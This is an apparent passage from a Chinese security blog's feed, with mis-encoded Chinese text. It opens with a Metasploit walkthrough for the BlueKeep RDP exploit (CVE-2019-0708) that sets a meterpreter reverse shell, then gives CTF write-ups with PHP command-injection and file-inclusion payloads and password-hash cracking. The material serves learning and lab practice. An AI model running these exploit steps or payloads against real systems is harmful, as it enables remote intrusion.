src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3886760211.png"></p><p>å°†ç›¸åº”çš„EXPæ”¾åˆ°kailié‡Œé¢ç›¸åº”çš„ä½ç½®ï¼Œè‹¥æ˜¯ç›¸åŒæ–‡ä»¶åå°±æ›¿æ¢ï¼Œè‹¥æ˜¯ä¸å­˜åœ¨çš„æ–‡ä»¶å°±åˆ›å»ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rd</span><br><span class="line">rdp_scanner.rb-&gt;&#x2F;usr&#x2F;share&#x2F;Metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb-&gt;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb-&gt;&#x2F;usr&#x2F;share&#x2F;Metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf5 &gt; reload_all # åŠ è½½0708exp</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set rhosts 10.1.8.8</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;show targets</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;set LHOST 10.1.8.167  </span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;set LPORT 1234</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt;show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3042730166.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/963131218.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/181923855.png"></p><blockquote><p>æ³¨æ„äº‹é¡¹<br>Targetè¦é€‰å¯¹ï¼›<br>å¦‚æœæ²¡æœ‰åå¼¹å›æ¥å¯ä»¥å°è¯•æ¢ä¸€ä¸‹ç›‘å¬åå¼¹çš„ç«¯å£ã€‚</p></blockquote><h1 id="05-æ‰¹é‡æ£€æµ‹"><a href="#05-æ‰¹é‡æ£€æµ‹" class="headerlink" title="05 æ‰¹é‡æ£€æµ‹"></a>05 æ‰¹é‡æ£€æµ‹</h1><p>è¿™é‡Œå‚è€ƒçš„æ˜¯<a href="https://github.com/biggerwing/CVE-2019-0708-poc">https://github.com/biggerwing/CVE-2019-0708-poc</a><br>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘åœ¨åŸæ¥åŸºç¡€ä¸ŠåŠ äº†ä¸ªå°†æˆåŠŸçš„ç»“æœä¿å­˜åœ¨å•ç‹¬æ–‡ä»¶çš„åŠŸèƒ½ã€‚</p><p><strong>Windows python3ç¯å¢ƒ</strong><br>ç”¨æ³•ï¼š</p><ol><li>ç¼–è¾‘3389_hostsï¼Œå°†å¾…æ£€æµ‹çš„IPåœ°å€å†™å…¥æ–‡ä»¶ï¼Œä¸€è¡Œä¸€ä¸ª</li><li>å‘½ä»¤è¡Œåˆ‡æ¢åˆ°ä»£ç æ‰€åœ¨çš„ç›®å½•ï¼Œè¿è¡Œpython3 cve-2019-0708.py</li></ol><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/253012111.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/591965806.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-åŸè°…æ¯ 2020</title>
      <link href="2020/11/17/2020ctfshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/"/>
      <url>2020/11/17/2020ctfshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸè°…1"><a href="#åŸè°…1" class="headerlink" title="åŸè°…1"></a>åŸè°…1</h2><p><a href="https://pan.baidu.com/s/1Tq_IJGRU-sjjtrW7pxfhIA">é™„ä»¶</a>ï¼ˆæå–ç ï¼š8ouyï¼‰</p><p>ä¸€å¼ å›¾ç‰‡ä¸€ä¸ªåŠ å¯†çš„åŒ…ï¼Œå¾ˆæ˜æ˜¾éœ€è¦é€šè¿‡å›¾ç‰‡å¾—åˆ°å¯†ç <br>è°éŸ³æ¢—1317bi77p9u â„¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1477852635.png"></p><p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><blockquote><p>å‰§æƒ…1<br>å¤§æ¦‚ä¸€ä¸ªæœˆå‰ï¼Œé—²é±¼ä¸Šæœ‰ä¸ªäººæ‰¾åˆ°æˆ‘ï¼Œå¸Œæœ›æˆ‘èƒ½å¸®å¿™åšä¸€ä¸ªæ±‚å©šè§†é¢‘ã€‚åœ¨å’Œä»–æ²Ÿé€šçš„è¿‡ç¨‹ä¸­ï¼ŒçŸ¥é“ä»–ä¸ºè¿™æ¬¡çš„æ±‚å©šå‡†å¤‡äº†å¾ˆä¹…ï¼Œç”šè‡³äºåŠå¤œæˆ‘ç»™ä»–çœ‹æˆå“çš„æ—¶å€™ï¼Œä»–è¿˜åœ¨å¸ƒç½®åœºåœ°ï¼Œé‚£ä¸ªæ—¶å€™ï¼Œç¦»ä»–çš„æ±‚å©šè¿˜æœ‰28å¤©ã€‚<br>åœ¨å’Œä»–çš„æ²Ÿé€šè¿‡ç¨‹ä¸­ï¼Œèƒ½æ„Ÿå—åˆ°ä»–å¯¹å¥³ç”Ÿçš„çè§†ã€‚ä»–èƒ½ç»†è‡´åœ°è®²å‡ºæ¯ä¸€å¼ ç…§ç‰‡èƒŒåå‘ç”Ÿçš„æ•…äº‹ï¼Œå½“æ—¶çš„å¿ƒæƒ…å’Œå¥¹çš„æƒ…ç»ªã€‚æˆ‘ä¸€è¾¹å¸®ä»–å‰ªè§†é¢‘ï¼Œä¸€è¾¹æ„Ÿå—ç€ä»–ä»¬ç”œç”œçš„æ‹çˆ±ã€‚æˆ‘è¿™ä¸ªå¤šæ„å–„æ„Ÿçš„äººå½“æ—¶ä¹Ÿæ˜¯æ»¡å¸¦ç¥ç¦çš„å¸®ä»–å‰ªå®Œäº†è§†é¢‘ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3770627338.png"></p><p>æŠŠå›¾ç‰‡ä¸¢stegå°±å‡ºflagäº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1421393481.png"></p><h2 id="åŸè°…2"><a href="#åŸè°…2" class="headerlink" title="åŸè°…2"></a>åŸè°…2</h2><p>åˆæ˜¯ä¸ªåŠ å¯†çš„åŒ…butæœ‰ä¸ªhint</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2741080403.png"></p><p>ç«æ˜Ÿè¯­è½¬ä¸€ä¸‹æˆåŠŸå¾—åˆ°å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3711803311.png"></p><p>è§£å¼€å°±æ‹¿åˆ°äº†flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1464559978.png"></p><blockquote><p>PSï¼šå‰§æƒ…2<br>åæ¥åˆ°äº†åº”è¯¥æ˜¯ä»–æ±‚å©šçš„é‚£ä¸ªæ™šä¸Šï¼Œæˆ‘çœ‹åˆ°ä»–å‘äº†ä¸€æ¡æœ‹å‹åœˆï¼Œè¯´â€œå¾—ä¹‹æˆ‘å¹¸ï¼Œå¤±ä¹‹æˆ‘å‘½â€ï¼Œç¬¬äºŒå¤©ä¹Ÿæ˜¯è¿å‘äº†ä¸¤æ¡æ¶ˆæçš„æœ‹å‹åœˆï¼Œæˆ‘çŒœä»–åº”è¯¥æ˜¯æ±‚å©šå¤±è´¥äº†ï¼Œé—æ†¾ä¹‹ä½™åœ¨è¯„è®ºé‡Œå®‰æ…°äº†å‡ å¥ã€‚<br>åæ¥å¾®ä¿¡çš„æ¶ˆæ¯æ¡†é‡Œå°±å¼¹æ¥äº†ä»–çš„æ¶ˆæ¯ã€‚äº‹æƒ…çœŸçš„æ˜¯å‡ºäººæ„æ–™ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4164112326.png"></p><h2 id="åŸè°…3-æ¥ä»½è‰²å›¾"><a href="#åŸè°…3-æ¥ä»½è‰²å›¾" class="headerlink" title="åŸè°…3_æ¥ä»½è‰²å›¾"></a>åŸè°…3_æ¥ä»½è‰²å›¾</h2><p>å¾ˆæ˜æ˜¾å¾—é€šè¿‡å›¾ç‰‡å¾—åˆ°å¯†ç ä»è€Œè·å–flag<br>binwalkå‘ç°æœ‰ä¸¤å¼ png</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3676490941.png"></p><p>foremoståˆ†ç¦»ä¸€ä¸‹å¾—åˆ°ä¸¤å¼ ä¸€æ ·çš„å›¾ç‰‡ï¼Œå¾ˆæ˜æ˜¾æ˜¯ç›²æ°´å°ï¼Œè„šæœ¬è·‘ä¸€ä¸‹å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4122562080.png"></p><h2 id="åŸè°…4"><a href="#åŸè°…4" class="headerlink" title="åŸè°…4"></a>åŸè°…4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php isset($_GET[&#39;xbx&#39;])?system($_GET[&#39;xbx&#39;]):highlight_file(__FILE__);</span><br><span class="line">payloadï¼š?xbx&#x3D;php -f &#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1923348643.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸè°…æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF-å…¬å¼€èµ› 2020</title>
      <link href="2020/11/15/2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2020/11/15/2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h2><p><a href="https://pan.baidu.com/s/1Mhxy_nUyEw25vbt2CvCtHQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šn39cï¼‰</p><p>010æ‰“å¼€å›¾ç‰‡åœ¨ç»“å°¾å¤„å‘ç°Bç«™é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/598115823.png"></p><p>æ‰“å¼€åœ¨è¯„è®ºåŒºå‘ç°flag</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1547313866.png"></p><h2 id="é˜´é˜³äººç¼–ç "><a href="#é˜´é˜³äººç¼–ç " class="headerlink" title="é˜´é˜³äººç¼–ç "></a>é˜´é˜³äººç¼–ç </h2><p><a href="https://pan.baidu.com/s/19INkoQyHAJTVs3-oXPA8gA">é™„ä»¶</a>ï¼ˆæå–ç ï¼šjle3ï¼‰</p><p>ä¸éš¾çœ‹å‡ºæ–‡æœ¬å°± â€œå°±è¿™.â€ã€â€œå°±è¿™Â¿â€ã€â€œä¸ä¼šå§!â€ä¸‰ä¸ªå…³é”®è¯ï¼Œç›²çŒœä¸€æ‰‹æ‘©æ–¯å¯†ç èŠœæ¹–:airplane:<br>â€œ<strong>å°±è¿™.<strong>â€æ›¿æ¢â€œ</strong>.<strong>â€ï¼›â€œ</strong>å°±è¿™Â¿</strong>â€æ›¿æ¢â€œ**-<strong>â€ï¼›â€œ</strong>ä¸ä¼šå§!<strong>â€æ›¿æ¢â€œ</strong>/**â€</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1208720704.png"></p><p>æœ€åå¾—çŸ¥è¿™æ˜¯<a href="https://www.splitbrain.org/services/ook">brainfuck-Ookç¼–ç </a><br>â€œ<strong>å°±è¿™.<strong>â€æ›¿æ¢â€œ</strong>Ook.<strong>â€ï¼›â€œ</strong>å°±è¿™Â¿</strong>â€æ›¿æ¢â€œ**Ook?<strong>â€ï¼›â€œ</strong>ä¸ä¼šå§!<strong>â€æ›¿æ¢â€œ</strong>Ook!**â€<br>è§£ç å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3908912025.png"></p><h2 id="çˆ·çš„å†é™©è®°"><a href="#çˆ·çš„å†é™©è®°" class="headerlink" title="çˆ·çš„å†é™©è®°"></a>çˆ·çš„å†é™©è®°</h2><p><a href="https://pan.baidu.com/s/1u-7AXF3U2Eq4hcZpSAI3sw">é™„ä»¶</a>ï¼ˆæå–ç ï¼šsrkoï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/246549646.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/241535348.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2856221616.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2000163713.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2267993934.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3164410673.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/935912376.png"></p><p>999999çš„hintåº”è¯¥å°±æ˜¯flagï¼Œä¿®æ”¹é‡‘é¢å³å¯å¾—åˆ°flagï¼ˆå¡ä½ä¸ä¼šâ„¢</p><h2 id="è¢«åˆ é™¤çš„flag"><a href="#è¢«åˆ é™¤çš„flag" class="headerlink" title="è¢«åˆ é™¤çš„flag"></a>è¢«åˆ é™¤çš„flag</h2><p><a href="https://pan.baidu.com/s/103QUMLnyDc8ItXnIwNVmxg">é™„ä»¶</a>ï¼ˆæå–ç ï¼š6ivqï¼‰</p><p>è®°äº‹æœ¬æ‰“å¼€å°±èƒ½çœ‹åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1173275403.png"></p><h2 id="æ’•åçš„äºŒç»´ç "><a href="#æ’•åçš„äºŒç»´ç " class="headerlink" title="æ’•åçš„äºŒç»´ç "></a>æ’•åçš„äºŒç»´ç </h2><p><a href="https://pan.baidu.com/s/1squl6jlAcD8VzjiJcwh4IQ">é™„ä»¶</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3220251783.png"></p><p>æ‰«ç å¾—åˆ°flagï¼šunctf{QR@2yB0x}</p><h2 id="YLBâ€™s-CAPTCHA-ç­¾åˆ°é¢˜"><a href="#YLBâ€™s-CAPTCHA-ç­¾åˆ°é¢˜" class="headerlink" title="YLBâ€™s CAPTCHA - ç­¾åˆ°é¢˜"></a>YLBâ€™s CAPTCHA - ç­¾åˆ°é¢˜</h2><p>è¾“å¯¹åæ¬¡ylbéªŒè¯ç å³å¯å¾—åˆ°flag</p><h2 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h2><p><a href="https://pan.baidu.com/s/1EgjiRxG-hztkQPCdAz-fLQ">é™„ä»¶</a>ï¼ˆæå–ç ï¼šbph4ï¼‰</p><p>æ‹¼å›¾å¾—åˆ°flagæ‹¼å›¾å¾—åˆ°flag<br>â‘ .montage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage &quot;D:\Harvey\èµ›é¢˜\UNCTF2020\æ‚é¡¹\ez_image\*.jpg&quot; -tile 15x15 -geometry +0+0 result.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2304282341.jpg"></p><p>â‘¡.gapsï¼ˆPS:ç¬¬ä¸€æ¬¡æ²¡æ‹¼æˆåŠŸ~ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps --image&#x3D;&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;result.png --generation&#x3D;30 --population&#x3D;300 --size&#x3D;60</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2743089469.png"></p><h2 id="é›¶"><a href="#é›¶" class="headerlink" title="é›¶"></a>é›¶</h2><p><a href="https://pan.baidu.com/s/1sziWscrJRNzl_RcQ10CSyQ">é™„ä»¶</a>ï¼ˆæå–ç ï¼šp5o6ï¼‰</p><p>é›¶å®½åº¦å­—ç¬¦éšå†™<br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">åœ¨çº¿ç½‘ç«™</a>ï¼ˆç§‘å­¦ä¸Šç½‘ï¼‰</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3417377872.png"></p><h2 id="èº²çŒ«çŒ«"><a href="#èº²çŒ«çŒ«" class="headerlink" title="èº²çŒ«çŒ«"></a>èº²çŒ«çŒ«</h2><p><a href="https://pan.baidu.com/s/1KjIEd6VMIrqcV3vLuz9TJg">é™„ä»¶</a></p><p>å¾ˆæ˜æ˜¾æ˜¯ä¸ªå‹ç¼©åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/591207936.png"></p><p>æŸ¥æ‰¾å‘ç°ä¸€ä¸²å­—ç¬¦ä¸²ï¼ˆbase64</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/540403340.png"></p><p>å…¶ä¸­ %7B å’Œ %7D åˆ†åˆ«è¡¨ç¤º { å’Œ }</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1210444813.png"></p><h2 id="å€’å½±"><a href="#å€’å½±" class="headerlink" title="å€’å½±"></a>å€’å½±</h2><p><a href="https://pan.baidu.com/s/1T6qkr9c7hSvghOCWlJYmPw">é™„ä»¶</a>ï¼ˆæå–ç ï¼šswwfï¼‰</p><p>æ‹–è¿›010æŸ¥çœ‹ä¸€ä¸‹ï¼Œåº•éƒ¨å‘ç°base64</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2886110428.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/562922845.png"></p><p>ç»“åˆé¢˜ç›®å€’å½±ï¼Œå€’è¿‡æ¥çœ‹æ˜¯ä¸ªzipçš„æ–‡ä»¶å¤´</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2799153501.png"></p><p>æ‰“å¼€è¿˜æ˜¯åŠ å¯†çš„åŒ…ï¼Œçˆ†ç ´æ‰“å¼€å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3282112415.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1116856245.png"></p><h2 id="YLBç»å¯†æ–‡ä»¶"><a href="#YLBç»å¯†æ–‡ä»¶" class="headerlink" title="YLBç»å¯†æ–‡ä»¶"></a>YLBç»å¯†æ–‡ä»¶</h2><p>å¿«åšå‡ºæ¥äº†.jpg</p><h2 id="ç½‘ç»œæ·±å¤„1"><a href="#ç½‘ç»œæ·±å¤„1" class="headerlink" title="ç½‘ç»œæ·±å¤„1"></a>ç½‘ç»œæ·±å¤„1</h2><blockquote><p>é¢˜ç›®æè¿°ï¼šå¥½å­©å­ä¸è¦ä¸Šæ´‹è‘±é¸­<br><a href="https://pan.baidu.com/s/1IyMRa9slYcBSK3KcusG7QA">é™„ä»¶</a>ï¼ˆæå–ç ï¼špjlhï¼‰</p></blockquote><p>ç”¨Audacityæ‰“å¼€,æŸ¥çœ‹é¢‘è°±å›¾ï¼Œæ ¹æ®DTMFï¼Œåˆ†åˆ«è®¾ç½®é«˜å’Œä½ï¼Œè®°ä¸‹é¢‘ç‡ï¼ŒæŸ¥è¡¨ï¼Œå†™ä¸‹æ‰‹æœºå·15975384265</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/725844625.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/28486961.png"></p><p>æˆ–è€…ç›´æ¥ç”¨å·¥å…·ç›´æ¥è§£å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/732991174.png"></p><p>çœ‹ç¬¬äºŒä¸ªéŸ³é¢‘çš„é¢‘è°±å›¾å¾—åˆ°Tupperï¼Œç™¾åº¦ä¸€ä¸‹å¯çŸ¥è¾“å…¥ç¬¬ä¸€ä¸ªæ–‡ä»¶å¾—åˆ°çš„kå€¼å°±å¯å¾—åˆ°flagã€‚ï¼ˆé¢˜ç›®é‡Œç»™çš„é‚£ä¸²æ•°å­—å°±æ˜¯kå€¼<br>åœ¨çº¿ç½‘ç«™ï¼š<a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1404594639.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/157590495.png"></p><h2 id="ä½ èƒ½ç ´è§£æˆ‘çš„å¯†ç å—"><a href="#ä½ èƒ½ç ´è§£æˆ‘çš„å¯†ç å—" class="headerlink" title="ä½ èƒ½ç ´è§£æˆ‘çš„å¯†ç å—"></a>ä½ èƒ½ç ´è§£æˆ‘çš„å¯†ç å—</h2><p><a href="https://pan.baidu.com/s/1PslL1Tgq2tAzf2eUfIPWtg">é™„ä»¶</a>ï¼ˆæå–ç ï¼š96quï¼‰</p><p>shadowæ–‡ä»¶ æ˜¯linuxç³»ç»Ÿä¸­è®°è½½rootå¯†ç çš„ä¿å¯†æ€§æ–‡ä»¶</p><p>é€šè¿‡ä¸‹è½½ <a href="http://www.openwall.com/john/"><strong>joh</strong>n</a> å·¥å…·è¿›è¡Œç ´è§£</p><p>è¿›å…¥ run ç›®å½•ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show shadow</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°å¯†ç 123456ï¼Œmd5åŠ å¯†åå³ä¸ºflag</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="éå±±å¤§æ³•å®˜å¼€åº­ä¹‹ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥"><a href="#éå±±å¤§æ³•å®˜å¼€åº­ä¹‹ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥" class="headerlink" title="éå±±å¤§æ³•å®˜å¼€åº­ä¹‹ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥"></a>éå±±å¤§æ³•å®˜å¼€åº­ä¹‹ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥</h2><blockquote><p>é¢˜ç›®æè¿°ï¼šæŸæ—¥ï¼Œéå±±å¤§æ³•å®˜åœ¨ç‚¹å¤–å–æ—¶ç‚¹äº†2ä¸ªéŸ­èœç›’å­ï¼Œå•†å®¶åªé€äº†1ä¸ªï¼Œå¤§æ³•å®˜ç»™äº†è¯¥å•†å®¶ä¸€ä¸ªå·®è¯„<br>æ¬¡æ—¥ï¼Œè¯¥å¤§æ³•å®˜åˆåœ¨è¯¥å•†å®¶ç‚¹äº†1ä¸ªéŸ­èœç›’å­ï¼Œå¸Œæœ›å•†å®¶èƒ½è¡¥ä¸Šä¸Šæ¬¡çš„éŸ­èœç›’å­ï¼Œè€Œå•†å®¶åˆåªå‘äº†ä¸€ä¸ªéŸ­èœç›’å­<br>è¿™åå¤§æ³•å®˜ä¸€å¤©æ­£å¸¸è¦åƒ2ä¸ªéŸ­èœç›’å­ï¼Œè€Œè¯¥å•†å®¶æ¯å¤©åªç»™ä»–1ä¸ªéŸ­èœç›’å­ï¼Œè¯·é—®è¯¥åå¤§æ³•å®˜ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥<br>ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</p></blockquote><p>å¤šæ¬¡å°è¯•å¾—çŸ¥æ˜¯åŸ¹æ ¹å¯†ç <br>â€œ<strong>0</strong>â€æ›¿æ¢â€œ<strong>a</strong>â€ï¼›â€œ<strong>t</strong>â€æ›¿æ¢â€œ<strong>b</strong>â€ã€‚è§£å¯†å¾—åˆ°flagï¼ˆæäº¤å¤§å†™çš„æ‰è¡Œâ€¦ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3413436341.png"></p><h2 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h2><blockquote><p>é¢˜ç›®æè¿°ï¼šä½ è¿‡officeäºŒçº§äº†å—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3003389888.png"></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/739926366.png"></p><h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><p>æ–‡ä»¶åŒ…å«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ„é€ payloadï¼š?a&#x3D;include $_GET[&quot;harvey&quot;] ?&gt;&amp;harvey&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3581257471.png"></p><p>base64å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2183693196.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrikeæºç åˆ†äº«</title>
      <link href="2020/11/12/CobaltStrike%E6%BA%90%E7%A0%81%E5%88%86%E4%BA%AB/"/>
      <url>2020/11/12/CobaltStrike%E6%BA%90%E7%A0%81%E5%88%86%E4%BA%AB/</url>
      
